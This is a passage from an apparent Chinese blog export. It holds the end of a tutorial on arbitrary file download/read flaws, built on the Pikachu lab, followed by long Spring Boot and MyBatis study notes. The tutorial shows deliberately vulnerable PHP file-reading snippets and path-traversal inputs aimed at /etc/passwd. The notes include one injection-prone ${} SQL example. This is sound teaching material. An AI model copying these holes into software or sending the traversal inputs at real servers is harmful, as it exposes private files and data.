什么是任意文件下载&#x2F;读取？任意文件读取&#x2F;下载漏洞（Arbitrary File Read&#x2F;Download Vulnerability），是指攻击者可以通过某些漏洞，绕过应用程序的限制，直接读取或下载应用程序之外的文件。
这种漏洞通常是由于应用程序没有对用户输入进行充分的验证和过滤而导致的。攻击者可以通过构造恶意的请求来利用该漏洞，从而读取或下载他们本来无权访问的文件，如密码、私钥、证书等，会提供攻击者更多可用信息，提高被入侵的风险。
这里以 Pikachu 靶场的 unsafe filedownload 模块为例：
下载文件后复制下载链接
得到：http://192.168.127.140/pikachu/vul/unsafedownload/execdownload.php?filename=kb.png
filename通过GET方法传入后端
直接看代码

filename传进来后直接拼接在download下了，没有进行过滤，所以引发了任意文件下载&#x2F;读取漏洞
1、漏洞利用条件1. 

存在读文件的函数：
 fopen()
 $file = $_GET[&#x27;file&#x27;]; // 用户提供的文件路径$fp = fopen($file, &#x27;r&#x27;); // 打开文件$data = fread($fp, filesize($file)); // 读取文件内容fclose($fp); // 关闭文件echo $data; // 输出文件内容

 fread()
 $file = $_GET[&#x27;file&#x27;]; // 用户提供的文件路径$fp = fopen($file, &#x27;r&#x27;); // 打开文件$data = fread($fp, 1024); // 读取文件前 1024 字节的内容fclose($fp); // 关闭文件echo $data; // 输出文件内容

 include()
 $file = $_GET[&#x27;file&#x27;]; // 用户提供的文件路径include($file); // 包含文件并输出内容

 readfile()
 $file = $_GET[&#x27;file&#x27;]; // 用户提供的文件路径readfile($file); // 读取并输出文件内容

 file_get_context()
 $file = $_GET[&#x27;file&#x27;]; // 用户提供的文件路径$data = file_get_contents($file); // 读取文件内容echo $data; // 输出文件内容

 file()
 $file = $_GET[&#x27;file&#x27;]; // 用户提供的文件路径$data = file($file); // 将文件读入数组中echo implode(&#x27;&#x27;, $data); // 输出文件内容

 2.读取文件的路径用户可控且未校验或校验不严
 3.输出了文件内容


漏洞类型index.php?f=../../../../../../etc/passwdindex.php?f=../index.phpindex.php?f=ﬁle:///etc/passwd

当参数 f 的参数值为php文件时， 若是文件被解析则是文件包含漏洞，若显示源码或提示下载则是文件查看与下载漏洞。
]]></content>
      <categories>
        <category>Web安全</category>
        <category>任意文件下载漏洞</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>PHP</tag>
        <tag>任意文件下载漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>Java-web</title>
    <url>/2025/05/24/javaweb/</url>
    <content><![CDATA[nginx打包部署#vue项目目录下npm run build

打包好后会有一个dist文件夹
部署：将dist复制到nginx的&#x2F;html中,启动nginx.exe 占用80端口（默认）


若端口被占用,在nginx.conf里更改
Maven





依赖配置
&lt;dependencies&gt;        &lt;dependency&gt;                &lt;groupId&gt;ch.qos.logback&lt;/groupId&gt;                &lt;artifactId&gt;logback-classic&lt;/artifactId&gt; &lt;!--先写这个,其他idea可以代码提示--&gt;                &lt;version&gt;1.5.6&lt;/version&gt;        &lt;/dependency&gt;&lt;/dependencies&gt;


依赖传递
排除依赖依赖范围
生命周期



SpringBoot






@RestController@RestController 通常用于创建 REST API,其中每个方法的返回值都是 HTTP 响应体的一部分。这使得开发人员可以专注于业务逻辑,而不必担心视图解析和模型数据的填充。
@RequestMapping()注解在 Java 的 Spring 框架中,@RequestMapping注解用于将 HTTP 请求映射到控制器的处理方法上。这个注解可以用于类或方法上,用于定义请求的 URL 模式、HTTP 方法（如 GET、POST）、请求参数、头部信息等。

package com.example.demo.controller;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RestController;//请求处理类@RestControllerpublic class HelloController &#123;        //请求路径        @RequestMapping(&quot;/Hello&quot;)        public String Hello()&#123;                return &quot;Hello SpringBoot&quot;;        &#125;&#125;

HTTP协议

请求数据格式请求行,请求头,请求体

请求头与请求体之间用空行隔开

常见请求头：
User-Agent用于浏览器兼容性处理
响应数据格式相应行,响应头,响应体&#x2F;响应正文

状态码


最常见:
常见响应头
Web服务器-Tomcat
基本使用

端口冲突解决：
程序解析
创建springboot项目时要关联start.spring.io,所以创建时需要联网



起步依赖的版本依赖于父工程,版本依赖于父工程版本

Spring Boot-Web的maven依赖中已经内嵌了tomcat


请求响应请求
HttpServletRequest称为请求对象
HttpServletResponse称为响应对象

DispatcherServlet称为前端控制器&#x2F;核心控制器

postman工具
简单参数 
package com.example.demo.controller;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RestController;@RestControllerpublic class RequestController &#123;        @RequestMapping(&quot;/Args&quot;)        //请求的参数名与接收参数名必须一致,不然接收到的就是null        public String RequestController(String name,String passwd)&#123;                String response = name+&#x27;:&#x27;+passwd;                System.out.println(response);                return response;        &#125;&#125;




package com.example.demo.controller;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RequestParam;import org.springframework.web.bind.annotation.RestController;@RestControllerpublic class RequestController &#123;        @RequestMapping(&quot;/Args&quot;)        //请求的参数名与接收参数名必须一致,不然接收到的就是null        public String RequestController(@RequestParam(name = &quot;name&quot;,required = true)String name, @RequestParam(name = &quot;passwd&quot;) String password)&#123;                String response = name+&#x27;:&#x27;+password;                System.out.println(response);                return response;        &#125;&#125;




实体参数
实体都放在pojo下（自己建目录）


至少要有请求参数

@RequestMapping(&quot;/simplePojo&quot;)public String simplyPojo(User user)&#123;    System.out.println(user);    return &quot;OK&quot;;&#125;


如果改变参数名字就不能封装进去,参数值为null


请求如下：




控制台输出
数组参数

@RequestMapping(&quot;/arrayParam&quot;)public String arrayParam(String[] param)&#123;    System.out.println(Arrays.toString(param));    return &quot;OK&quot;;&#125;


集合参数
不用@RequestParam会被解释成数组而非集合


日期参数


json参数
postman请求json参数方法：

url中要加上请求路径,否则报错

键名与形参对象属性名相同

使用@RequestBody标识
@RequestMapping(&quot;/jsonParam&quot;)       public String jsonParam(@RequestBody User user)&#123;               System.out.println(user);               return &quot;OK&quot;;       &#125;


路径参数单个路径

多个路径
响应@ResponseBody注解
响应字符串@RequestMapping(&quot;/str&quot;)public String stringResponse() &#123;    return &quot;Hello SpringBoot&quot;;&#125;


响应对象响应格式为json
@RequestMapping(&quot;/obj&quot;)public Address objResponse() &#123;    Address address = new Address();    address.setProvince(&quot;福建&quot;);    address.setCity(&quot;泉州&quot;);    return address;&#125;


响应集合响应格式为json数组
@RequestMapping(&quot;/List&quot;)public List&lt;Address&gt; listResponse() &#123;    Address address = new Address();    address.setProvince(&quot;福建&quot;);    address.setCity(&quot;泉州&quot;);    Address address2 = new Address();    address2.setProvince(&quot;福建&quot;);    address2.setCity(&quot;厦门&quot;);    List&lt;Address&gt; list = new ArrayList&lt;&gt;();    list.add(address2);    list.add(address);    return list;&#125;


统一响应结果上面三种响应格式都不同,不便于前后端开发


package com.example.demo.POJO;public class Result &#123;        //响应码 success:0 error:-1        private Integer code;        //提示信息        private String msg;        //返回数据        private Object data;        public Result() &#123;        &#125;        public Result(Integer code, String msg, Object data) &#123;                this.code = code;                this.msg = msg;                this.data = data;        &#125;        public Integer getCode() &#123;                return code;        &#125;        public void setCode(Integer code) &#123;                this.code = code;        &#125;        public String getMsg() &#123;                return msg;        &#125;        public void setMsg(String msg) &#123;                this.msg = msg;        &#125;        public Object getData() &#123;                return data;        &#125;        public void setData(Object data) &#123;                this.data = data;        &#125;        @Override        public String toString() &#123;                return &quot;Result&#123;&quot; +                        &quot;code=&quot; + code +                        &quot;, msg=&#x27;&quot; + msg + &#x27;\&#x27;&#x27; +                        &quot;, data=&quot; + data +                        &#x27;&#125;&#x27;;        &#125;        public static Result success(Object data)&#123;                return new Result(0,&quot;success&quot;,data);        &#125;                public static Result success()&#123;                return new Result(0,&quot;success&quot;,null);        &#125;                public static Result error(String errMsg)&#123;                return new Result(-1,errMsg,null);        &#125;&#125;

static方法用于快速构建Result对象
响应字符串@RequestMapping(&quot;/str&quot;)public Result stringResponse() &#123;    //return new Result(0,&quot;success&quot;,&quot;Hello SpringBoot&quot;);    return Result.success(&quot;Hello SpringBoot&quot;);&#125;


响应对象响应格式为json
@RequestMapping(&quot;/obj&quot;)public Result objResponse() &#123;    Address address = new Address();    address.setProvince(&quot;福建&quot;);    address.setCity(&quot;泉州&quot;);    //return new Result(0,&quot;success&quot;,address);    return Result.success(address);&#125;


响应集合响应格式为json数组
@RequestMapping(&quot;/List&quot;)public Result listResponse() &#123;    Address address = new Address();    address.setProvince(&quot;福建&quot;);    address.setCity(&quot;泉州&quot;);    Address address2 = new Address();    address2.setProvince(&quot;福建&quot;);    address2.setCity(&quot;厦门&quot;);    List&lt;Address&gt; list = new ArrayList&lt;&gt;();    list.add(address2);    list.add(address);    //return new Result(0,&quot;success&quot;,list);    return Result.success(list);&#125;


案例
pom.xml中添加坐标&lt;dependency&gt;    &lt;groupId&gt;org.dom4j&lt;/groupId&gt;    &lt;artifactId&gt;dom4j&lt;/artifactId&gt;    &lt;version&gt;2.1.3&lt;/version&gt;&lt;/dependency&gt;

工具类XmlParserUtils
package com.example.demo.Utils;import org.dom4j.Document;import org.dom4j.DocumentException;import org.dom4j.Element;import org.dom4j.io.SAXReader;import java.io.File;import java.lang.reflect.Constructor;import java.util.ArrayList;import java.util.List;/** * XML解析工具类 * 提供将XML文件解析为Java对象列表的功能 */public class XmlParserUtils &#123;        /**         * 将XML文件解析为指定类型的对象列表         *         * @param file        XML文件路径         * @param targetClass 目标对象类型         * @param &lt;T&gt;         泛型类型         * @return 解析后的对象列表         * @throws DocumentException 如果XML解析失败         */        public static &lt;T&gt; List&lt;T&gt; parse(String file, Class&lt;T&gt; targetClass) throws DocumentException &#123;                // 1. 创建SAXReader对象用于读取XML                SAXReader reader = new SAXReader();                // 2. 读取XML文件并获取Document对象                Document document = reader.read(new File(file));                // 3. 获取XML根元素                Element rootElement = document.getRootElement();                // 4. 获取所有emp元素                List&lt;Element&gt; elements = rootElement.elements(&quot;emp&quot;);                // 5. 准备返回的结果列表                List&lt;T&gt; list = new ArrayList&lt;&gt;();                try &#123;                        // 6. 遍历集合,得到每一个emp标签                        for (Element element : elements) &#123;                                // 获取name属性                                String name = element.element(&quot;name&quot;).getText();                                // 获取age属性                                String age = element.element(&quot;age&quot;).getText();                                // 获取image属性                                String image = element.element(&quot;image&quot;).getText();                                // 获取gender属性                                String gender = element.element(&quot;gender&quot;).getText();                                // 获取job属性                                String job = element.element(&quot;job&quot;).getText();                                // 7. 获取目标类的构造方法                                Constructor&lt;T&gt; constructor = targetClass.getDeclaredConstructor(                                        String.class, Integer.class, String.class, String.class, String.class                                );                                // 8. 设置构造方法可访问（即使是私有构造方法）                                constructor.setAccessible(true);                                // 9. 使用反射创建对象实例                                T object = constructor.newInstance(                                        name,                                        Integer.parseInt(age),                                        image,                                        gender,                                        job                                );                                // 10. 将创建的对象添加到列表                                list.add(object);                        &#125;                &#125; catch (Exception e) &#123;                        throw new RuntimeException(&quot;XML解析为对象失败&quot;, e);                &#125;                return list;        &#125;&#125;

Emp类public class Emp &#123;        private String name;        private Integer age;        private String image;        private String gender;        private String job;        public Emp() &#123;        &#125;        public Emp(String name, Integer age, String image, String gender, String job) &#123;                this.name = name;                this.age = age;                this.image = image;                this.gender = gender;                this.job = job;        &#125;        public String getName() &#123;                return name;        &#125;        public void setName(String name) &#123;                this.name = name;        &#125;        public Integer getAge() &#123;                return age;        &#125;        public void setAge(Integer age) &#123;                this.age = age;        &#125;        public String getImage() &#123;                return image;        &#125;        public void setImage(String image) &#123;                this.image = image;        &#125;        public String getGender() &#123;                return gender;        &#125;        public void setGender(String gender) &#123;                this.gender = gender;        &#125;        public String getJob() &#123;                return job;        &#125;        public void setJob(String job) &#123;                this.job = job;        &#125;&#125;

处理请求类EmpController假设前端请求路径如下：

那么@RequestMapping中的路径就为”&#x2F;listEmp”
package com.example.demo.controller;import com.example.demo.POJO.Emp;import com.example.demo.POJO.Result;import com.example.demo.Utils.XmlParserUtils;import org.dom4j.DocumentException;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RestController;import java.util.List;@RestControllerpublic class EmpController &#123;        @RequestMapping(&quot;/listEmp&quot;)        public Result list() throws DocumentException &#123;                //1.加载并解析emp.xml                //动态加载xml文件                String file = this.getClass().getClassLoader().getResource(&quot;emp.xml&quot;).getFile();                List&lt;Emp&gt; empList = XmlParserUtils.parse(file, Emp.class);                //2.对数据进行转换处理                //流式处理                empList.stream().forEach(emp -&gt; &#123;                        String gender = emp.getGender();                        if (&quot;1&quot;.equals(gender)) &#123;                                emp.setGender(&quot;男&quot;);                        &#125; else if (&quot;2&quot;.equals(gender)) &#123;                                emp.setGender(&quot;女&quot;);                        &#125;                        String job = emp.getJob();                        if (&quot;1&quot;.equals(job)) &#123;                                emp.setJob(&quot;老师&quot;);                        &#125; else if (&quot;2&quot;.equals(job)) &#123;                                emp.setJob(&quot;主任&quot;);                        &#125;else if(&quot;3&quot;.equals(job))&#123;                                emp.setJob(&quot;就业指导&quot;);                        &#125;                &#125;);                //3.响应数据                return Result.success(empList);        &#125;&#125;

响应结果：

分层解耦三层架构


Dao层-数据访问Dao对数据的访问方式很多（文件,数据库等）,想要灵活处理需要使用接口

package com.example.demo.Dao;import com.example.demo.POJO.Emp;import java.util.List;public interface EmpDao &#123;        //获取员工列表        public List&lt;Emp&gt; getListEmp();&#125;

它的实现类A：

package com.example.demo.Dao.impl;import com.example.demo.Dao.EmpDao;import com.example.demo.POJO.Emp;import com.example.demo.Utils.XmlParserUtils;import org.dom4j.DocumentException;import java.util.List;public class EmpDaoA implements EmpDao &#123;        @Override        public List&lt;Emp&gt; getListEmp() throws DocumentException &#123;                //1.加载并解析emp.xml                //动态加载xml文件                String file = this.getClass().getClassLoader().getResource(&quot;emp.xml&quot;).getFile();                return XmlParserUtils.parse(file, Emp.class);        &#125;&#125;

Service层-业务逻辑处理与Dao层类似,想要灵活处理,使用接口

package com.example.demo.service;import com.example.demo.POJO.Emp;import java.util.List;public interface EmpService &#123;        //返回处理后的emp列表        public List&lt;Emp&gt; ListEmp();&#125;

它的实现类：
要处理数据,需要从Dao层获取,那么需要定义Dao对象
package com.example.demo.service.impl;import com.example.demo.Dao.EmpDao;import com.example.demo.Dao.impl.EmpDaoA;import com.example.demo.POJO.Emp;import com.example.demo.service.EmpService;import org.dom4j.DocumentException;import java.util.List;public class EmpServiceA implements EmpService &#123;        //面向接口编程        private EmpDao empDao = new EmpDaoA();        @Override        public List&lt;Emp&gt; ListEmp() throws DocumentException &#123;                List&lt;Emp&gt; empList = empDao.getListEmp();                empList.stream().forEach(emp -&gt; &#123;                        String gender = emp.getGender();                        if (&quot;1&quot;.equals(gender)) &#123;                                emp.setGender(&quot;男&quot;);                        &#125; else if (&quot;2&quot;.equals(gender)) &#123;                                emp.setGender(&quot;女&quot;);                        &#125;                        String job = emp.getJob();                        if (&quot;1&quot;.equals(job)) &#123;                                emp.setJob(&quot;老师&quot;);                        &#125; else if (&quot;2&quot;.equals(job)) &#123;                                emp.setJob(&quot;主任&quot;);                        &#125; else if (&quot;3&quot;.equals(job)) &#123;                                emp.setJob(&quot;就业指导&quot;);                        &#125;                &#125;);                                return empList;        &#125;&#125;

Controller层-接收请求,响应数据需要调底下1层的接口
package com.example.demo.controller;import com.example.demo.Dao.EmpDao;import com.example.demo.POJO.Emp;import com.example.demo.POJO.Result;import com.example.demo.Utils.XmlParserUtils;import com.example.demo.service.EmpService;import com.example.demo.service.impl.EmpServiceA;import org.dom4j.DocumentException;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RestController;import java.util.List;@RestControllerpublic class EmpController &#123;        private EmpService empService = new EmpServiceA();        @RequestMapping(&quot;/listEmp&quot;)        public Result list() throws DocumentException &#123;                //1.加载并解析emp.xml                //2.对数据进行转换处理                List&lt;Emp&gt; empList = empService.ListEmp();                //3.响应数据                return Result.success(empList);        &#125;&#125;


分层解耦
EmpController中的empService是Service层实现类的实例,说明这两层耦合
解决方法：容器
 

  
步骤
@Component注解在Dao层、Service实现类前加上该注解,表示将该类交给IOC容器管理,成为IOC容器中的bean
这样一来Controller层想要切换底层,直接更改@Component作用的类就行
@Componentpublic class EmpDaoA implements EmpDao &#123;        @Override        public List&lt;Emp&gt; getListEmp() throws DocumentException &#123;                //1.加载并解析emp.xml                //动态加载xml文件                String file = this.getClass().getClassLoader().getResource(&quot;emp.xml&quot;).getFile();                return XmlParserUtils.parse(file, Emp.class);        &#125;&#125;



@Autowired注解运行时,IOC容器会提供该类型的bean对象,并赋值给该变量 - 依赖注入
@RestControllerpublic class EmpController &#123;        @Autowired        private EmpService empService;        @RequestMapping(&quot;/listEmp&quot;)        public Result list() throws DocumentException &#123;                //1.加载并解析emp.xml                //2.对数据进行转换处理                List&lt;Emp&gt; empList = empService.ListEmp();                //3.响应数据                return Result.success(empList);        &#125;&#125;

IOC详解Bean的声明
Controller层不用再加@Controller,因为@RestController&#x3D;@Repository+@Controller

为什么称之为@Component的衍生类？


//可以以这样的形式为Bean对象起名字@Service(&quot;Name&quot;)

注意事项
Bean组件扫描
规范：将Dao放在启动类所在包
不规范：找不到包

就需要在启动类上使用@ComponentScan

源码显示,@ComponentScan需要接受String数组作为所在包
package com.example.demo;import org.springframework.boot.SpringApplication;import org.springframework.boot.autoconfigure.SpringBootApplication;import org.springframework.context.annotation.ComponentScan;@ComponentScan(&#123;&quot;Dao&quot;,&quot;com.example.demo&quot;&#125;)@SpringBootApplicationpublic class DemoApplication &#123;        public static void main(String[] args) &#123;                SpringApplication.run(DemoApplication.class, args);        &#125;&#125;

我们为什么数组中传入两个包呢？
@SpringBootApplication中集成的@ComponentScan扫描的是启动类所在的包；
在@ComponentScan中声明其他的包会覆盖掉启动类所在的包,所以需要重新声明启动类所在的包
DI详解如果有多个相同类型的Bean：




@Primary多个相同类型的Bean,加上@Primary的那个生效




@Qualifier在@AutoWired前加上@Qualifier(“Bean名字”)
package com.example.demo.controller;import com.example.demo.POJO.Emp;import com.example.demo.POJO.Result;import com.example.demo.service.EmpService;import org.dom4j.DocumentException;import org.springframework.beans.factory.annotation.Autowired;import org.springframework.beans.factory.annotation.Qualifier;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RestController;import java.util.List;@RestControllerpublic class EmpController &#123;    	//EmpServiceA默认的bean名字        @Qualifier(&quot;empServiceA&quot;)        @Autowired        private EmpService empService;        @RequestMapping(&quot;/listEmp&quot;)        public Result list() throws DocumentException &#123;                //1.加载并解析emp.xml                //2.对数据进行转换处理                List&lt;Emp&gt; empList = empService.ListEmp();                //3.响应数据                return Result.success(empList);        &#125;&#125;

@Resource与@Qualifier的区别：

@Qualifier按照类型注入

@Resource按照名称注入;使用@Resource后就不用@Autowired了
  package com.example.demo.controller;import com.example.demo.POJO.Emp;import com.example.demo.POJO.Result;import com.example.demo.service.EmpService;import jakarta.annotation.Resource;import org.dom4j.DocumentException;import org.springframework.beans.factory.annotation.Autowired;import org.springframework.beans.factory.annotation.Qualifier;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RestController;import java.util.List;@RestControllerpublic class EmpController &#123;//        @Qualifier(&quot;empServiceA&quot;)//        @Autowired        @Resource(name = &quot;empServiceB&quot;)        private EmpService empService;        @RequestMapping(&quot;/listEmp&quot;)        public Result list() throws DocumentException &#123;                //1.加载并解析emp.xml                //2.对数据进行转换处理                List&lt;Emp&gt; empList = empService.ListEmp();                //3.响应数据                return Result.success(empList);        &#125;&#125;


Mybatis
准备工作



springboot工程

配置文件spring.application.name=Mybatis-demospring.datasource.driver-class-name=com.mysql.cj.jdbc.Driver#数据库名spring.datasource.url=jdbc:mysql://localhost:3306/mybatis#用户名spring.datasource.username=root#密码spring.datasource.password=114514

@Mapper注解Mybatis中Mapper层其实就和Dao层差不多
在运行时，会自动生成该接口的实现类对象（代理对象），并且将该对象交给IOC容器管理
package com.wwwtty.mybatisdemo.mapper;import com.wwwtty.mybatisdemo.pojo.User;import org.apache.ibatis.annotations.Mapper;import org.apache.ibatis.annotations.Select;import java.util.List;@Mapperpublic interface UserMapper &#123;        @Select(&quot;select* from user&quot;)        public List&lt;User&gt; list();&#125;

进行单元测试
package com.wwwtty.mybatisdemo;import com.wwwtty.mybatisdemo.mapper.UserMapper;import com.wwwtty.mybatisdemo.pojo.User;import org.junit.jupiter.api.Test;import org.springframework.beans.factory.annotation.Autowired;import org.springframework.boot.test.context.SpringBootTest;import java.util.List;@SpringBootTestclass MybatisDemoApplicationTests &#123;        @Autowired        UserMapper userMapper;        @Test        public void UserListTest()&#123;                List&lt;User&gt; list = userMapper.list();                list.stream().forEach(user -&gt;&#123;                        System.out.println(user);                &#125;);        &#125;&#125;

@SpringBootTest进行单元测试时，也会加载整个springboot环境

配置sql提示





功能强大qaq：

JDBC（面向接口编程）
JDBC只提供接口，由数据库厂商实现具体方法
 
缺点：


数据库连接池
 



实现了DataSource接口

切换连接池只需要引入maven依赖

&lt;dependency&gt;    &lt;groupId&gt;com.alibaba&lt;/groupId&gt;    &lt;artifactId&gt;druid-spring-boot-starter&lt;/artifactId&gt;    &lt;version&gt;1.2.8&lt;/version&gt;&lt;/dependency&gt;

本地测试还得在properties文件加上：
spring.datasource.type=com.alibaba.druid.pool.DruidDataSource

才能：

或者：
由于我的springboot版本为：

因此坐标中的druid-spring-boot-starter应该改成druid-spring-boot-3-starter
&lt;dependency&gt;    &lt;groupId&gt;com.alibaba&lt;/groupId&gt;    &lt;artifactId&gt;druid-spring-boot-3-starter&lt;/artifactId&gt;    &lt;version&gt;1.2.22&lt;/version&gt;&lt;/dependency&gt;


另一种配置方式

lombokpojo类再加上getter&#x2F;setter等方法之后，太过于臃肿


引入依赖&lt;dependency&gt;    &lt;groupId&gt;org.projectlombok&lt;/groupId&gt;    &lt;artifactId&gt;lombok&lt;/artifactId&gt;&lt;/dependency&gt;

@Data包含了@Getter，@Setter，@ToString，@EqualsAndHashCode
不包含构造器
package com.wwwtty.mybatisdemo.pojo;import lombok.AllArgsConstructor;import lombok.Data;import lombok.Getter;import lombok.NoArgsConstructor;@Data@NoArgsConstructor@AllArgsConstructorpublic class User &#123;        private Integer id;        private String username;        private String password;        private String email;&#125;


上述注解的作用在于根据注解生成一系列方法
User的字节码文件反编译：


Mybatis基础操作删除操作@Deletepackage com.wwwtty.basic_op.Mapper;import org.apache.ibatis.annotations.Delete;import org.apache.ibatis.annotations.Mapper;@Mapperpublic interface EmpMapper &#123;        @Delete(&quot;delete from emp where id = 1&quot;)        void delete();&#125;

这么做的局限性是，id是静态的，但是前端传进来的id参数肯定是动态的
传递参数在@Delete中将参数用#&#123;&#125;包围

package com.wwwtty.basic_op.Mapper;import org.apache.ibatis.annotations.Delete;import org.apache.ibatis.annotations.Mapper;@Mapperpublic interface EmpMapper &#123;        @Delete(&quot;delete from emp where id = #&#123;id&#125;&quot;)        void delete(Integer id);&#125;

如何拿到影响的记录数呢，改一下返回值就可以
package com.wwwtty.basic_op.Mapper;import org.apache.ibatis.annotations.Delete;import org.apache.ibatis.annotations.Mapper;@Mapperpublic interface EmpMapper &#123;        @Delete(&quot;delete from emp where id = 1&quot;)        Integer delete();&#125;

@Testvoid contextLoads() &#123;    System.out.println(empMapper.delete(5));&#125;


测试表内容如下：

用@Autowired注入
package com.wwwtty.basic_op;import com.wwwtty.basic_op.Mapper.EmpMapper;import org.junit.jupiter.api.Test;import org.springframework.beans.factory.annotation.Autowired;import org.springframework.boot.test.context.SpringBootTest;@SpringBootTestclass BasicOpApplicationTests &#123;        @Autowired        private EmpMapper empMapper;        @Test        void contextLoads() &#123;                empMapper.delete(5);        &#125;&#125;


Mybatis日志输出#mybatis日志输出,输出到控制台mybatis.configuration.log-impl=org.apache.ibatis.logging.stdout.StdOutImpl

运行结果：
使用了参数化查询技术（预编译查询）
预编译SQL优势
参数占位符
新增操作@Insertinsert中的字段太多，可以直接封装成一个对象
用lombok封装getter&#x2F;setter等方法

package com.wwwtty.mybatis_insert.Mapper;import com.wwwtty.mybatis_insert.pojo.Emp;import org.apache.ibatis.annotations.Insert;import org.apache.ibatis.annotations.Mapper;@Mapperpublic interface EmpMapper &#123;        @Insert(&quot;insert into emp (id,name,email) values (#&#123;id&#125;,#&#123;name&#125;,#&#123;email&#125;)&quot;)        void Insert(Emp emp);&#125;

package com.wwwtty.mybatis_insert;import com.wwwtty.mybatis_insert.Mapper.EmpMapper;import com.wwwtty.mybatis_insert.pojo.Emp;import org.junit.jupiter.api.Test;import org.springframework.beans.factory.annotation.Autowired;import org.springframework.boot.test.context.SpringBootTest;@SpringBootTestclass MybatisInsertApplicationTests &#123;        @Autowired        EmpMapper empMapper;        @Test        void contextLoads() &#123;                Emp emp = new Emp();                emp.setId(5);                emp.setEmail(&quot;114514@acceed.com&quot;);                emp.setName(&quot;淳平&quot;);                empMapper.Insert(emp);        &#125;&#125;

日志输出：

主键返回
@Optionspackage com.wwwtty.mybatis_insert.Mapper;import com.wwwtty.mybatis_insert.pojo.Emp;import org.apache.ibatis.annotations.Insert;import org.apache.ibatis.annotations.Mapper;import org.apache.ibatis.annotations.Options;@Mapperpublic interface EmpMapper &#123;        /*        * keyProperty:主键值赋值给实体类哪个对象        * useGeneratedKeys:获取主键值        * */        @Options(keyProperty = &quot;id&quot;, useGeneratedKeys = true)        @Insert(&quot;insert into emp (name,email) values (#&#123;name&#125;,#&#123;email&#125;)&quot;)        void Insert(Emp emp);&#125;

这样一来getId()就不会返回null
package com.wwwtty.mybatis_insert;import com.wwwtty.mybatis_insert.Mapper.EmpMapper;import com.wwwtty.mybatis_insert.pojo.Emp;import org.junit.jupiter.api.Test;import org.springframework.beans.factory.annotation.Autowired;import org.springframework.boot.test.context.SpringBootTest;@SpringBootTestclass MybatisInsertApplicationTests &#123;        @Autowired        EmpMapper empMapper;        @Test        void contextLoads() &#123;                Emp emp = new Emp();//                emp.setId(5);                emp.setEmail(&quot;114514@acceed.com&quot;);                emp.setName(&quot;林丹&quot;);                empMapper.Insert(emp);                System.out.println(emp.getId());        &#125;&#125;


更新操作@Update
package com.wwwtty.mybatis_update.Mapper;import com.wwwtty.mybatis_update.pojo.Emp;import org.apache.ibatis.annotations.Mapper;import org.apache.ibatis.annotations.Update;@Mapperpublic interface EmpMapper &#123;        @Update(&quot;update emp set name=#&#123;name&#125;,email=#&#123;email&#125; where id=#&#123;id&#125;&quot;)        void update(Emp emp);&#125;

执行结果：


查询操作package com.wwwtty.mybatis_select.Mapper;import com.wwwtty.mybatis_select.pojo.Emp;import org.apache.ibatis.annotations.Mapper;import org.apache.ibatis.annotations.Select;import java.util.List;@Mapperpublic interface EmpMapper &#123;        @Select(&quot;select* from emp where id = #&#123;id&#125;&quot;)        List&lt;Emp&gt; getById(Integer id);&#125;

package com.wwwtty.mybatis_select;import com.wwwtty.mybatis_select.Mapper.EmpMapper;import com.wwwtty.mybatis_select.pojo.Emp;import org.junit.jupiter.api.Test;import org.springframework.beans.factory.annotation.Autowired;import org.springframework.boot.test.context.SpringBootTest;@SpringBootTestclass MybatisSelectApplicationTests &#123;        @Autowired        EmpMapper empMapper;        @Test        void contextLoads() &#123;                Emp emp = new Emp();                emp.setId(5);                System.out.println(empMapper.getById(5));        &#125;&#125;

运行结果：

数据封装

@Results，@Result/** column:字段名* property:类中属性名* */@Results(&#123;    @Result(column = &quot;&quot;,property = &quot;&quot;),    @Result(column = &quot;&quot;,property = &quot;&quot;)&#125;)

开启mybatis驼峰命名自动映射开关 a_column -&gt; aColumn#开启mybatis驼峰命名自动映射开关(直接搜索骆驼(camel))mybatis.configuration.map-underscore-to-camel-case=true

条件查询

select * from user where name like &#x27;%张%&#x27; and gender=1 and entrydate between &#x27;2010-01-01&#x27; and &#x27;2020-01-01&#x27; order by update_time desc

这些参数不好封装到一个对象中去，直接传参数
@Select(&quot;select * from user where name like &#x27;%$&#123;name&#125;%&#x27; and gender=#&#123;gender&#125; and &quot; +        &quot;entrydate between #&#123;begin&#125; and #&#123;end&#125; order by update_time desc&quot;)List&lt;User&gt; list(String name, Short gender, LocalDate begin,LocalDate end);

进行模糊匹配的时候，要用’%%’的形式，这样就不能用预编译的#{}(占位符不能出现在引号内)，需要用拼接sql的${}(不推荐)
@Test    void test() &#123;    List&lt;User&gt; res = empMapper.list(&quot;张&quot;, (short) 1, LocalDate.of(2010, 1, 1), LocalDate.of(2020, 1, 1));    res.stream().forEach(user -&gt; &#123;    	System.out.println(user);    &#125;);&#125;


怎么解决拼接的问题
concat()@Select(&quot;select * from user where name like concat(&#x27;%&#x27;,#&#123;name&#125;,&#x27;%&#x27;) and gender=#&#123;gender&#125; and &quot; +        &quot;entrydate between #&#123;begin&#125; and #&#123;end&#125; order by update_time desc&quot;)List&lt;User&gt; list(String name, Short gender, LocalDate begin,LocalDate end);


早期版本不会保留形参名

XML映射文件

与包名一致

与接口名一致

xml文件的约束：https://mybatis.p2hp.com/getting-started.html
&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;!DOCTYPE mapper        PUBLIC &quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;        &quot;https://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;&gt;&lt;!--mapper根标签--&gt;&lt;mapper namespace=&quot;com.wwwtty.xml_reflect.mapper.EmpMapper&quot;&gt;        &lt;!--    id:Mapper类中的方法名    --&gt;        &lt;!--   resultType:返回值所封装的单条记录的类型的全类名,比如返回值是List&lt;User&gt;,填的就是User的全类名     --&gt;        &lt;select id=&quot;list&quot; resultType=&quot;&quot;&gt;                        &lt;/select&gt;&lt;/mapper&gt;

获取全类名：

原查询语句：
